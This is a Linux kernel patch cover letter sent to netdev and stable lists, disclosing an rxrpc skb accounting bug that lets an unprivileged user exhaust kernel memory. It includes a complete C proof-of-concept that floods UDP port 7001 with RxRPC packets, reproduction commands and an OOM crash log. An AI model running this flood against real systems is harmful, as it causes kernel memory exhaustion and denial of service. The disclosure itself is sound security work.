Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0C26543E49A
	for <stable@vger.kernel.org>; Wed,  9 Sep 2026 07:45:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788939910; cv=none; b=MMP5nmG41NyUGx8xc7eWKuYL1Ao7i6kjufGZtbpRkgi/UX69LY8Udb5IlxjwN+ZBdc6XF8eUt3MM7HLFWENjjPgcm9MlaHmdgzbi6hjYVDZGo4vLDHyD1w3ip3wA89VPekb4SL5tF/fHyGj1AsPVOKOK3Nx5qzhtY1qf023U4bA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788939910; c=relaxed/simple;
	bh=0qfRUP6QTB5T2UVMzUz07zxYiv+Kc1mD1PM26Ynhobc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MQt1C1TAfdiguP6FTyXFkZrH4WihvPlipdlbNfY37JYHV9E5Gfp5623fzRwuLT14kH0vf0QJpW8brbFVaw2d5XwpWgiV2gx2+yeF/RFbdqIEg9E2bioMOovR2vUt7+kHiQgAAnONqzP8MfycZglLtCPsgGweovIIhqGF8AxVAcM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=aGixXbT5; arc=none smtp.client-ip=209.85.216.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="aGixXbT5"
Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-398b3d66515so5494914a91.0
        for <stable@vger.kernel.org>; Wed, 09 Sep 2026 00:45:06 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788939906; x=1789544706; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=9Nuyyz7FQW6yAuP94Z7H76Rqh+Glv5foF7UVlilt2/s=;
        b=aGixXbT5MYh2al5Ca5414kyLuvuAjHLIjAgvmf5veq4MPUFDc07cfvE3p5B3rRHqHl
         2CmNPAfMIrf6pMXh8hsgjHke00zGtQDiiCVubj6rPA4ZZRM+RJ7R6IpMY2e2x/CKSIUf
         8gd+dEknI8R4RHTSdFy5k5Eh9WETigydC+Qx9ouQ7VRhlb4rLP1+ABCP433TZ5woVl54
         Wfmq98WrR8OsLo/D9nddRB0U1yFHxBXGn8gYyBDYKzg0Gbck6rYB+0ixJdc5oHUjly//
         YaUNRV9Pcy2JMYXSrnC8mM31Ge3ZyxdMvvw8K+tnaBPwgHzH10HJN9OdtOfI7poCFf0C
         yioA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788939906; x=1789544706;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=9Nuyyz7FQW6yAuP94Z7H76Rqh+Glv5foF7UVlilt2/s=;
        b=BuLp0ieLSfyVNW5G39KS6rbJJy6Zn8vec7JhUTAxsTL6o+0bxFmTpvoL11zx7gXcPH
         Sn2qqcaSUr3RUaZbFzKEc7RFaXm0E8Xd/tO6RFW42LdhfIDtff6U5QJyh4bPZ4S0tVVN
         Uk/APWvhvSwQep8fK3K5XFSSznN7IMmG68mWbWguAuxwWEFK9dgCgHxexugJLe5XPCHz
         ff4O776Z3dyqb+bOfSTnHg0CmdW9O/X1nHksnWb8vHt0ZyoN5UJ9v5daPutbj6TyOfrr
         8vNOdL34qtn8hzi5KCAf8YA0M7yVXBbbAHPwGAuNI44sAdI6mhYuDoOPuqty0Mg9fCsI
         KPUA==
X-Forwarded-Encrypted: i=1; AKwUvBxiz1SGY2vEk6tx8HGH4elWU315CQjqodoJb2KnAAMYwMujZy0RNUsoMjJeE7SZj+s/tyd5O6c=@vger.kernel.org
X-Gm-Message-State: AFuF++mNOU8ESD+ORK0e73Cbm6OJR4UfkBRceYlYdYH57iFcwUzynspA
	t6Vgb4vHe5CrO5AUrPNQBdDPUhmE/hTFtNekwmXe7Q1SzYICRpTDIuZXYTDC0ePAOI9Q
X-Gm-Gg: AYBFou10JZL+Oa7R6mx81uXRsbQt2UU+02LhBkpLepVf6zGecNHn8EzKcGTRjhmNaDU
	aOOU0YLoY0oS8Y4E1/mXdazuZ2x4ObkG3UkjwC2M7jrb4GbIzIGdbxvxCKFML6Ybw+C1do3g+Es
	2zXfFJE/04T17fBbud1J6ObyVx0If53h+FKOK3loNVtXUZsbAagnX+CiRlL/OJMC5jeCVSkqDjs
	TqEh1T8NdAE6jsMXdp/eHISn4DMLsSSOimKxwZQVzIprlljy8OWL/sEFBrX5f5zthphOE7XtJAT
	pTRzgJ3l0KiD5R6v8sEK/ePPTfoRWtRcrVm14oPXwfTYs6RY0l2oyS/jS2fM/RaelITr3c+6ZkR
	AdCidL2KXt/hQmb07+MgUmo8aWW/r0ZDSGws8AHWNi6aPzh1zr4eKm9md+g9R5Fg/gjrX8um/oa
	rNSWPiO2DirxJJEHUspAE9OTVijDl07eB4dieVedgaC1MurgdqpEl8wrRdiAlI6heyrOy9zpuCH
	I7ZPZMhem5D0zZsKi/echKjyFnJjfL6xk0DIC/8
X-Received: by 2002:a17:90a:d644:b0:398:9c00:29ec with SMTP id 98e67ed59e1d1-39b26245cfcmr52738151a91.20.1788939905577;
        Wed, 09 Sep 2026 00:45:05 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b07b197a9sm36300085a91.0.2026.09.09.00.45.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 09 Sep 2026 00:45:04 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	linux-afs@lists.infradead.org
Cc: David Howells <dhowells@redhat.com>,
	Marc Dionne <marc.dionne@auristor.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Luxing Yin <root@tr0jan.top>,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v4 0/1] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Wed,  9 Sep 2026 07:44:57 +0000
Message-ID: <cover.1788878590.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/rxrpc/io_thread.c and
net/rxrpc/local_object.c. A non-root user can flood the local
RxRPC queue via user and net namespace. The panic below is a
downstream OOM in rxrpc_reject_packet() after privileged CPU
pinning and a SCHED_FIFO hog against krxrpcio/7001, not an
allocation at the encap_rcv enqueue site.
We've tested the patch, and it should not affect any other
functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

rxrpc_encap_rcv() takes encapsulated UDP packets off the UDP receive
path and queues them on the RxRPC local queue without preserving UDP
receive-buffer accounting. A local AF_RXRPC service such as the AFS
callback listener can therefore be flooded with RxRPC-shaped UDP
packets that are no longer limited by the UDP socket rcvbuf.

The recorded panic is not an allocation at the encap_rcv enqueue
site. After privileged CPU pinning and a SCHED_FIFO hog against
krxrpcio/7001, that I/O thread OOMed while sending a reject:
rxrpc_reject_packet() -> sock_alloc_send_pskb() -> __alloc_skb() /
kmalloc_reserve(). Unreclaimable slab at panic was dominated by
skbuff_small_head (583145KB) and skbuff_head_cache (224273KB);
rxrpc_call_jar was only 363KB, so incoming-call setup was not
the main memory impact.

The recorded panic setup also wrote krxrpcio into a frozen cgroup.
That does not stop this kernel I/O thread: the crash Comm is still
krxrpcio/7001 in the allocator. The steps that actually slowed it
were pinning the thread to CPU1 and running a SCHED_FIFO hog on
that CPU:

    pid=
    for d in /proc/[0-9]*; do
        [ "$(cat $d/comm 2>/dev/null)" = "krxrpcio/7001" ] || continue
        pid=${d#/proc/}
    done
    taskset -p 2 "$pid"
    taskset -c 1 chrt -f 99 /bin/bash -c "while :; do :; done" &
    taskset -c 0 ./poc -t 16 -s 90 -l 8

The flood is the same sender below. Those extra steps are
privileged and are not part of the unshare -Urn Reproducer.

446b3e14525b is the first commit where encap_rcv() queued the skb
for later I/O-thread consumption instead of consuming it
immediately on the UDP receive path.

The patch reaccounts each encapsulated skb against the UDP socket
before queueing it and drops packets once sk_rcvbuf is exhausted.
The I/O thread orphans PACKET skbs when it dequeues them from the
local queue so UDP rmem ownership does not follow those packets onto
call or connection queues. Error-queue skbs keep their existing
destructor. skb_set_owner_r() does not take sk_refcnt, so
rxrpc_destroy_local() still clears sk_user_data under RCU protection
and delays sock_release() until the local queues are purged. That
covers skbs still sitting on local->rx_queue.

sk_forward_alloc is serialised with sk->sk_receive_queue.lock, the
same lock UDP uses. encap_rcv() takes it around the charge; the I/O
thread takes it with spin_lock_bh() around skb_orphan(). The packets
stay on the RxRPC local queue.

For this network-triggered bug we also considered packetdrill, but
the reproducer needs a sustained local flood of unique incoming RxRPC
calls rather than a short packetdrill script, so the dedicated sender
below was the direct way to validate the failure and the fix.

The in-kernel AFS client (CONFIG_AFS_FS) opens a callback manager
socket on UDP port 7001 when a network namespace is created. That
AF_RXRPC service is the krxrpcio/7001 listener the flood targets.
unshare -Urn is enough to get a private netns with that listener.

The crash log below is decoded against the unfixed vmlinux from the
same 7.3.0-rc1+ net/main guest that panicked. Comm: krxrpcio/7001
is the in-kernel I/O thread that invoked the OOM killer from
rxrpc_reject_packet(), not from encap_rcv() itself. The UDP
flood was sent by a non-root process via user and net
namespace. The recorded panic also used the privileged pin and
SCHED_FIFO hog commands above. Putting the I/O thread in
cgroup.freeze did not freeze that kthread.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

That unshare command is the unprivileged flood. The crash log
below is not from that command alone; it used the privileged
pin and SCHED_FIFO hog commands in Bug details.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_SERVICE_ID 1
#define AFS_CB_CALLBACK_OP 204
#define DEFAULT_PORT 7001
#define DEFAULT_THREADS 4
#define DEFAULT_SECONDS 20
#define DEFAULT_PAYLOAD 8

struct __attribute__((packed)) rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
};

struct thread_args {
	struct sockaddr_in6 dst;
	int seconds;
	size_t payload_len;
	uint32_t cid_seed;
	unsigned long sent;
};

static volatile sig_atomic_t stop_flag;

static void on_alarm(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void *sender_thread(void *arg)
{
	struct thread_args *ta = arg;
	int fd;
	char *packet;
	struct rxrpc_wire_header *hdr;
	uint32_t *op;
	uint32_t *count;
	uint32_t seq = 1;
	uint32_t cid = ta->cid_seed;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	packet = malloc(sizeof(*hdr) + ta->payload_len);
	if (!packet) {
		perror("malloc");
		close(fd);
		return NULL;
	}
	memset(packet + sizeof(*hdr), 0, ta->payload_len);
	hdr = (struct rxrpc_wire_header *)packet;
	hdr->callNumber = htonl(1);
	hdr->type = RXRPC_PACKET_TYPE_DATA;
	hdr->flags = RXRPC_CLIENT_INITIATED;
	hdr->userStatus = 0;
	hdr->securityIndex = 0;
	hdr->reserved = 0;
	hdr->serviceId = htons(RXRPC_SERVICE_ID);
	op = (uint32_t *)(packet + sizeof(*hdr));
	*op = htonl(AFS_CB_CALLBACK_OP);
	if (ta->payload_len >= 8) {
		count = op + 1;
		*count = htonl(1);
	}

	/*
	 * Each datagram is a new incoming RxRPC call (seq=1, unique cid).
	 * That makes the I/O thread do full incoming-call setup, so it
	 * falls behind encap_rcv and local->rx_queue can grow.
	 */
	while (!stop_flag) {
		hdr->epoch = htonl(0x80000000u | cid);
		hdr->cid = htonl(cid << 2);
		hdr->seq = htonl(1);
		hdr->serial = htonl(seq);
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >= 0) {
			ta->sent++;
			seq++;
			cid += 32;
		}
	}

	free(packet);
	close(fd);
	return NULL;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [-l payload_len]\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(DEFAULT_PORT),
	};
	const char *addr = "::1";
	int threads = DEFAULT_THREADS;
	int seconds = DEFAULT_SECONDS;
	size_t payload_len = DEFAULT_PAYLOAD;
	pthread_t *tids;
	struct thread_args *args;
	unsigned long total = 0;
	int opt;

	while ((opt = getopt(argc, argv, "a:p:t:s:l:h")) != -1) {
		switch (opt) {
		case 'a':
			addr = optarg;
			break;
		case 'p':
			dst.sin6_port = htons((uint16_t)strtoul(optarg, NULL, 0));
			break;
		case 't':
			threads = atoi(optarg);
			break;
		case 's':
			seconds = atoi(optarg);
			break;
		case 'l':
			payload_len = strtoul(optarg, NULL, 0);
			break;
		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (threads <= 0 || seconds <= 0 || payload_len < 4 || payload_len > 65000) {
		usage(argv[0]);
		return 1;
	}
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) != 1) {
		perror("inet_pton");
		return 1;
	}

	signal(SIGALRM, on_alarm);
	alarm(seconds);

	tids = calloc((size_t)threads, sizeof(*tids));
	args = calloc((size_t)threads, sizeof(*args));
	if (!tids || !args) {
		perror("calloc");
		return 1;
	}

	pthread_attr_t attr;
	if (pthread_attr_init(&attr) != 0) {
		perror("pthread_attr_init");
		return 1;
	}
	if (pthread_attr_setstacksize(&attr, 64 * 1024) != 0) {
		perror("pthread_attr_setstacksize");
		return 1;
	}

	for (int i = 0; i < threads; i++) {
		args[i].dst = dst;
		args[i].seconds = seconds;
		args[i].payload_len = payload_len;
		args[i].cid_seed = 1 + (uint32_t)i;
		if (pthread_create(&tids[i], &attr, sender_thread, &args[i]) != 0) {
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
			stop_flag = 1;
			threads = i;
			break;
		}
	}
	pthread_attr_destroy(&attr);

	for (int i = 0; i < threads; i++) {
		pthread_join(tids[i], NULL);
		total += args[i].sent;
	}

	printf("sent_packets=%lu payload_len=%zu threads=%d duration=%d\n",
	       total, payload_len, threads, seconds);
	free(args);
	free(tids);
	return 0;
}
------END poc.c--------

----BEGIN crash log----

[   82.081952][ T4954] krxrpcio/7001 invoked oom-killer: gfp_mask=0xc2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_COMP|__GFP_NOMEMALLOC), order=0, oom_score_adj=0
[   82.082063][ T4954] CPU: 1 UID: 0 PID: 4954 Comm: krxrpcio/7001 Not tainted 7.3.0-rc1+ #2 PREEMPT(full) 
[   82.082077][ T4954] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   82.082107][ T4954] Call Trac
** replaying previous printk message **
[   82.082107][ T4954] Call Trace:
[   82.082126][ T4954]  <TASK>
[   82.082132][ T4954]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   82.082327][ T4954]  dump_stack (lib/dump_stack.c:129)
[   82.082336][ T4954]  dump_header (mm/oom_kill.c:464)
[   82.082460][ T4954]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
[   82.082474][ T4954]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   82.082489][ T4954]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   82.082537][ T4954]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[   82.082628][ T4954]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   82.082640][ T4954]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[   82.082650][ T4954]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
[   82.082664][ T4954]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   82.082697][ T4954]  ? _raw_spin_unlock_irqrestore (include/linux/spinlock_api_smp.h:210 (discriminator 1) kernel/locking/spinlock.c:221)
[   82.082733][ T4954]  ? __refill_objects_node (include/linux/list.h:140 include/linux/list.h:261 include/linux/list.h:275 mm/slub.c:7276)
[   82.082753][ T4954]  allocate_slab (mm/slub.c:3347 (discriminator 2) mm/slub.c:3470)
[   82.082764][ T4954]  new_slab (mm/slub.c:3513)
[   82.082774][ T4954]  refill_objects (mm/slub.c:7410)
[   82.082783][ T4954]  ? __pcs_replace_empty_main (include/linux/local_lock_internal.h:62 (discriminator 1) mm/slub.c:4762)
[   82.082849][ T4954]  __pcs_replace_empty_main (mm/slub.c:2885 mm/slub.c:4774)
[   82.082880][ T4954]  kmem_cache_alloc_node_noprof (mm/slub.c:4850 mm/slub.c:4984 mm/slub.c:5068)
[   82.082892][ T4954]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[   82.083036][ T4954]  kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[   82.083048][ T4954]  __alloc_skb (net/core/skbuff.c:715)
[   82.083060][ T4954]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
[   82.083087][ T4954]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[   82.083103][ T4954]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6796)
[   82.083113][ T4954]  ? __local_bh_enable_ip (kernel/softirq.c:478)
[   82.083193][ T4954]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347 (discriminator 1))
[   82.083273][ T4954]  sock_alloc_send_pskb (net/core/sock.c:3015)
[   82.083286][ T4954]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   82.083329][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.083349][ T4954]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2847 (discriminator 2))
[   82.083360][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.083371][ T4954]  ? ipv6_dev_get_saddr (include/linux/rcupdate.h:882 net/ipv6/addrconf.c:1916)
[   82.083450][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.083463][ T4954]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[   82.083477][ T4954]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   82.083490][ T4954]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   82.083547][ T4954]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[   82.083568][ T4954]  ? ip6_mtu (net/ipv6/route.c:3290)
[   82.083585][ T4954]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[   82.083598][ T4954]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[   82.083610][ T4954]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   82.083624][ T4954]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[   82.083638][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.083652][ T4954]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[   82.083677][ T4954]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   82.083753][ T4954]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   82.083766][ T4954]  ? ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   82.083816][ T4954]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[   82.083829][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.083840][ T4954]  ? kasan_save_stack (mm/kasan/common.c:58)
[   82.083858][ T4954]  ? kasan_save_stack (mm/kasan/common.c:57)
[   82.083876][ T4954]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   82.083886][ T4954]  ? rcu_is_watching (include/linux/context_tracking.h:128 (discriminator 1) kernel/rcu/tree.c:753)
[   82.083911][ T4954]  ? __sanitizer_cov_trace_const_cmp1 (kernel/kcov.c:296)
[   82.083923][ T4954]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347 (discriminator 1))
[   82.083936][ T4954]  rxrpc_reject_packet (net/rxrpc/output.c:30 net/rxrpc/output.c:863)
[   82.083988][ T4954]  ? rxrpc_reject_packet (net/rxrpc/output.c:30 net/rxrpc/output.c:863)
[   82.084002][ T4954]  ? __pfx_rxrpc_reject_packet (net/rxrpc/output.c:801)
[   82.084017][ T4954]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   82.084031][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.084041][ T4954]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   82.084065][ T4954]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   82.084079][ T4954]  ? rxrpc_put_peer (net/rxrpc/peer_object.c:447)
[   82.084096][ T4954]  rxrpc_io_thread (net/rxrpc/io_thread.c:478)
[   82.084113][ T4954]  ? __pfx_rxrpc_io_thread (net/rxrpc/io_thread.c:108)
[   82.084124][ T4954]  ? kthread_affine_node (kernel/kthread.c:375)
[   82.084165][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.084179][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.084190][ T4954]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   82.084213][ T4954]  ? __pfx_rxrpc_io_thread (net/rxrpc/io_thread.c:108)
[   82.084224][ T4954]  kthread (drivers/block/aoe/aoecmd.c:1243)
[   82.084235][ T4954]  ? kthread (drivers/block/aoe/aoecmd.c:1243)
[   82.084248][ T4954]  ? __pfx_kthread (include/linux/list.h:175 (discriminator 2))
[   82.084261][ T4954]  ret_from_fork (arch/x86/kernel/process.c:158)
[   82.084292][ T4954]  ? __pfx_ret_from_fork (arch/x86/include/asm/desc.h:59 (discriminator 3))
[   82.084302][ T4954]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
[   82.084314][ T4954]  ? __switch_to (arch/x86/kernel/process_64.c:713 (discriminator 1))
[   82.084358][ T4954]  ? __pfx_kthread (include/linux/list.h:175 (discriminator 2))
[   82.084371][ T4954]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   82.084388][ T4954]  </TASK>
[   82.084393][ T4954] Mem-Info:
[   82.084398][ T4954] active_anon:6398 inactive_anon:2845 isolated_anon:0
[   82.084398][ T4954]  active_file:16 inactive_file:52 isolated_file:0
[   82.084398][ T4954]  unevictable:1768 dirty:0 writeback:0
[   82.084398][ T4954]  slab_reclaimable:9829 slab_unreclaimable:240960
[   82.084398][ T4954]  mapped:18 shmem:2716 pagetables:585
[   82.084398][ T4954]  sec_pagetables:0 bounce:0
[   82.084398][ T4954]  kernel_misc_reclaimable:0
[   82.084398][ T4954]  free:13879 free_pcp:431 free_cma:0
[   82.084722][ T4954] Node 0 active_anon:25592kB inactive_anon:11380kB active_file:64kB inactive_file:208kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:72kB dirty:0kB writeback:0kB shmem:10864kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9792kB pagetables:2340kB sec_pagetables:0kB all_unreclaimable? no Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[   82.084754][ T4954] Node 0 DMA free:5668kB boost:0kB min:524kB low:652kB high:780kB reserved_highatomic:0kB free_highatomic:0kB active_anon:4kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[   82.084797][ T4954] lowmem_reserve[]: 0 1295 1295 1295 1295
[   82.084816][ T4954] Node 0 DMA32 free:49848kB boost:6144kB min:50672kB low:61804kB high:72936kB reserved_highatomic:0kB free_highatomic:0kB active_anon:25588kB inactive_anon:11380kB active_file:64kB inactive_file:208kB unevictable:7072kB writepending:0kB zspages:0kB present:2080640kB managed:1326204kB mlocked:0kB bounce:0kB free_pcp:1724kB local_pcp:832kB free_cma:0kB
[   82.084846][ T4954] lowmem_reserve[]: 0 0 0 0 0
[   82.084864][ T4954] Node 0 DMA: 1*4kB (M) 2*8kB (UM) 1*16kB (M) 2*32kB (UM) 1*64kB (M) 1*128kB (M) 1*256kB (M) 2*512kB (UM) 2*1024kB (UM) 1*2048kB (U) 0*4096kB = 5668kB
[   82.084963][ T4954] Node 0 DMA32: 937*4kB (UME) 771*8kB (ME) 384*16kB (ME) 182*32kB (UME) 91*64kB (ME) 51*128kB (UME) 19*256kB (M) 13*512kB (UM) 2*1024kB (M) 1*2048kB (M) 0*4096kB = 49852kB
[   82.088154][ T4954] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[   82.088164][ T4954] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[   82.088172][ T4954] 3096 total pagecache pages
[   82.088193][ T4954] 0 pages in swap cache
[   82.088199][ T4954] Free swap  = 0kB
[   82.088202][ T4954] Total swap = 0kB
[   82.088206][ T4954] 524158 pages RAM
[   82.088209][ T4954] 0 pages HighMem/MovableOnly
[   82.088212][ T4954] 188767 pages reserved
[   82.088216][ T4954] 0 pages cma reserved
[   82.088220][ T4954] Unreclaimable slab info:
[   82.088223][ T4954] Name                      Used          Total
[   82.088251][ T4954] bio-464                   17KB         22KB
[   82.088258][ T4954] bio-528                   19KB         31KB
[   82.088266][ T4954] bio-544                   19KB         31KB
[   82.088273][ T4954] bio-552                   19KB         31KB
[   82.088390][ T4954] TIPC                      19KB         30KB
[   82.088399][ T4954] SCTPv6                    25KB         30KB
[   82.088408][ T4954] RXRPC                     46KB         64KB
[   82.088415][ T4954] rxrpc_call_jar           363KB        382KB
[   82.088424][ T4954] fib6_node                 15KB         16KB
[   82.088431][ T4954] ip6_dst_cache             15KB         18KB
[   82.088438][ T4954] RAWv6                     16KB         30KB
[   82.088445][ T4954] UDPv6                     67KB         94KB
[   82.088452][ T4954] TCPv6                     74KB         91KB
[   82.088467][ T4954] t10_alua_lu_gp_cache          8KB         11KB
[   82.088477][ T4954] scsi_sense_cache          15KB         16KB
[   82.088485][ T4954] virtio_scsi_cmd           21KB         24KB
[   82.088494][ T4954] bio-136                   43KB         44KB
[   82.088505][ T4954] bio-264                   10KB         15KB
[   82.088512][ T4954] mqueue_inode_cache         19KB         30KB
[   82.088521][ T4954] f2fs_evict_inode_work          7KB          7KB
[   82.088530][ T4954] bio-272                   10KB         15KB
[   82.088537][ T4954] f2fs_bio_post_read_ctx         30KB         31KB
[   82.088559][ T4954] jfs_mp                    14KB         15KB
[   82.088572][ T4954] cifs_small_rq             28KB         32KB
[   82.088580][ T4954] cifs_request              67KB         67KB
[   82.088587][ T4954] cifs_mpx_ids               8KB         11KB
[   82.088605][ T4954] cifs_io_subrequest         42KB         47KB
[   82.088611][ T4954] cifs_io_request          105KB        111KB
[   82.088622][ T4954] nfs_commit_data           24KB         31KB
[   82.088899][ T4954] nfs_write_data            40KB         47KB
[   82.088935][ T4954] jbd2_inode                10KB         11KB
[   82.088944][ T4954] ext4_system_zone           0KB          3KB
[   82.088952][ T4954] ext4_io_end_vec            3KB          7KB
[   82.090664][ T4954] fasync_cache               9KB         11KB
[   82.090677][ T4954] kvm_gmem_inode_cache         15KB         15KB
[   82.090687][ T4954] rpc_buffers               25KB         31KB
